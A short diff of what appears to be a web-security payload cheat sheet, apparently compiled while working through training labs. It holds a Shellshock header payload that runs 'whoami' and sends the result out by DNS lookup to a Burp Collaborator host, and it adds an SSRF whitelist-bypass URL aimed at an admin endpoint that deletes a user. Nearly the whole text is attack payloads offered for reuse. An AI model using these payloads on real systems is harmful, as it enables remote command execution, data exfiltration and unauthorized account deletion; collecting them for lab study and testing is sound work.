@@ -15,6 +15,7 @@ http://127.0.0.1/
 shellshock: Referer header, User-Agent header 
 () { :; }; /usr/bin/nslookup $(whoami).BURP-COLLABORATOR-SUBDOMAIN
 
+SSRF with whitelist-based input filter
 http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos
 
 out-of-band-detection: Referer header
